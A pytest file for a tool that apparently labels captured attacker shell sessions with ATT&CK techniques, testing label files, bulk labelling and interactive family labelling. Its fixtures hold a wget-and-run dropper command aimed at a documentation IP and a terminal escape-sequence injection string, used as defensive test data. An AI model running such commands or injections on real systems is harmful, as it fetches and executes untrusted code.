"""Labels: the file, bulk labelling, and the family labeller."""

from __future__ import annotations

import io
from pathlib import Path

import pytest

from deception_shield.labels import (
    Label,
    append_labels,
    label_all,
    label_interactively,
    labelled_sessions,
    parse_techniques,
    read_labels,
)


class TestTechniques:
    def test_identifiers_are_normalised_and_deduplicated(self) -> None:
        assert parse_techniques("t1105; T1059.004, T1105") == ("T1105", "T1059.004")

    def test_blank_is_none(self) -> None:
        assert parse_techniques("") == ()

    def test_anything_else_is_refused(self) -> None:
        with pytest.raises(ValueError, match="not ATT&CK"):
            parse_techniques("T1105, ssh-brute-force")


class TestLabelFile:
    def test_round_trip(self, tmp_path: Path) -> None:
        path = tmp_path / "labels.csv"
        append_labels(path, [Label("s/1", "attack", ("T1105",), family="f-1", note="dropper")])
        assert read_labels(path)["s/1"] == Label(
            "s/1", "attack", ("T1105",), family="f-1", note="dropper"
        )

    def test_the_last_row_for_a_session_wins(self, tmp_path: Path) -> None:
        path = tmp_path / "labels.csv"
        append_labels(path, [Label("s/1", "attack")])
        append_labels(path, [Label("s/1", "exclude", note="operator test")])
        assert read_labels(path)["s/1"].label == "exclude"
        assert path.read_text().count("s/1") == 2

    def test_a_missing_file_has_no_labels(self, tmp_path: Path) -> None:
        assert read_labels(tmp_path / "absent.csv") == {}

    def test_an_unknown_label_names_its_line(self, tmp_path: Path) -> None:
        path = tmp_path / "labels.csv"
        path.write_text("session_id,label\ns/1,attack\ns/2,malicious\n", encoding="utf-8")
        with pytest.raises(ValueError, match="labels.csv:3"):
            read_labels(path)

    def test_a_reshaped_file_keeps_its_columns(self, tmp_path: Path) -> None:
        """A label file reordered in a spreadsheet is extended, not corrupted."""
        path = tmp_path / "labels.csv"
        path.write_text("label,session_id\nbenign,h/1\n", encoding="utf-8")
        append_labels(path, [Label("s/1", "attack", ("T1105",))])
        assert path.read_text().splitlines() == ["label,session_id", "benign,h/1", "attack,s/1"]
        assert {k: v.label for k, v in read_labels(path).items()} == {
            "h/1": "benign",
            "s/1": "attack",
        }

    def test_required_columns(self, tmp_path: Path) -> None:
        path = tmp_path / "labels.csv"
        path.write_text("id,verdict\ns/1,attack\n", encoding="utf-8")
        with pytest.raises(ValueError, match="missing column"):
            read_labels(path)


class TestBulkLabelling:
    def test_only_unlabelled_sessions_are_labelled(self, tmp_path: Path, session_factory) -> None:
        path = tmp_path / "labels.csv"
        append_labels(path, [Label("h/1", "exclude")])
        sessions = [session_factory(f"h/{i}", origin="shell-history") for i in range(3)]
        assert label_all(sessions, path, "benign", note="baseline") == 2
        labels = read_labels(path)
        assert labels["h/1"].label == "exclude"
        assert labels["h/2"].method == "bulk" and labels["h/2"].note == "baseline"

    def test_the_label_must_be_known(self, tmp_path: Path, session_factory) -> None:
        with pytest.raises(ValueError):
            label_all([session_factory("h/1")], tmp_path / "labels.csv", "fine")


class Scripted:
    """Answers prompts from a list, and records what was asked."""

    def __init__(self, *answers: str) -> None:
        self.answers = list(answers)
        self.prompts: list[str] = []

    def __call__(self, prompt: str) -> str:
        self.prompts.append(prompt)
        if not self.answers:
            raise EOFError
        return self.answers.pop(0)


class TestInteractiveLabelling:
    @pytest.fixture
    def sessions(self, session_factory):
        dropper = [
            session_factory(
                f"s/{i}", ("cd /tmp; wget http://203.0.113.4/x; sh x",), source_ip=f"203.0.113.{i}"
            )
            for i in range(3)
        ]
        return dropper + [session_factory("s/9", ("uname -a",))]

    def test_one_decision_labels_a_whole_family(self, tmp_path: Path, sessions) -> None:
        path = tmp_path / "labels.csv"
        ask = Scripted("n", "a", "1, T1496.001", "b")
        out = io.StringIO()
        assert label_interactively(sessions, path, techniques=("T1105",), ask=ask, out=out) == 4

        labels = read_labels(path)
        assert {labels[f"s/{i}"].techniques for i in range(3)} == {("T1105", "T1496.001")}
        assert all(labels[f"s/{i}"].method == "family" for i in range(3))
        assert labels["s/9"].label == "benign" and labels["s/9"].techniques == ()
        assert "example 2 of 3" in out.getvalue()

    def test_quitting_keeps_what_was_decided_and_resumes_later(
        self, tmp_path: Path, sessions
    ) -> None:
        path = tmp_path / "labels.csv"
        assert label_interactively(sessions, path, ask=Scripted("x", "q"), out=io.StringIO()) == 3
        out = io.StringIO()
        assert label_interactively(sessions, path, ask=Scripted("b"), out=out) == 1
        assert "3 labelled, 1 to go" in out.getvalue()

    def test_end_of_input_stops_cleanly(self, tmp_path: Path, sessions) -> None:
        assert (
            label_interactively(sessions, tmp_path / "l.csv", ask=Scripted(), out=io.StringIO())
            == 0
        )

    def test_a_bad_technique_is_asked_again(self, tmp_path: Path, sessions) -> None:
        out = io.StringIO()
        ask = Scripted("a", "brute force", "T1105", "s")
        label_interactively(sessions, tmp_path / "labels.csv", ask=ask, out=out)
        assert "not ATT&CK" in out.getvalue()
        assert read_labels(tmp_path / "labels.csv")["s/0"].techniques == ("T1105",)

    def test_attacker_text_cannot_drive_the_terminal(self, tmp_path: Path, session_factory) -> None:
        out = io.StringIO()
        session = session_factory("s/1", ("echo hi\x1b[2J\x1b]0;owned\x07",))
        label_interactively([session], tmp_path / "labels.csv", ask=Scripted("s"), out=out)
        assert "\x1b" not in out.getvalue() and "\\x1b[2J" in out.getvalue()


def test_sessions_split_by_label(session_factory) -> None:
    sessions = [session_factory(f"s/{i}") for i in range(4)]
    labels = {
        "s/0": Label("s/0", "attack"),
        "s/1": Label("s/1", "benign"),
        "s/2": Label("s/2", "exclude"),
    }
    attack, benign, excluded, unlabelled = labelled_sessions(sessions, labels)
    assert [s.id for s in attack] == ["s/0"] and [s.id for s in benign] == ["s/1"]
    assert (excluded, unlabelled) == (1, 1)
